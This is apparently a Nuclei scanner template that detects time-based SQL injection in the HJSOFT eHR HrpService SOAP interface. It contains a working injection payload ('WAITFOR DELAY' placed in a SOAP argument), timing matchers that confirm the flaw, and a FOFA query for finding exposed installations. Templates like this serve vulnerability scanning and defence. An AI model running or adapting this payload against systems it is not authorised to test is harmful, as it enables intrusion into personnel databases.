id: hjsoft-ehr-hrpservice-sqli
info:
  name: "HJSOFT eHR HrpService 接口存在SQL注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: HJSOFT-eHR
  metadata:
    finger: 宏景eHR
    fofa-query: app="HJSOFT-HCM"

http:
  - raw:
      - |
        POST /services/HrpService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hr="http://www.hjsj.com/HrpService">
        <soapenv:Header/>
           <soapenv:Body>
              <hr:processResult>
                 <arg0>1);WAITFOR DELAY '0:0:5'--</arg0>
                 <arg1></arg1>
              </hr:processResult>
           </soapenv:Body>
        </soapenv:Envelope>
      - |
        POST /services/HrpService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hr="http://www.hjsj.com/HrpService">
        <soapenv:Header/>
           <soapenv:Body>
              <hr:processResult>
                 <arg0>1);WAITFOR DELAY '0:0:8'--</arg0>
                 <arg1></arg1>
              </hr:processResult>
           </soapenv:Body>
        </soapenv:Envelope>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "processResultResponse"
          - "HrpService"
      - type: word
        part: header
        words:
          - "text/xml"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
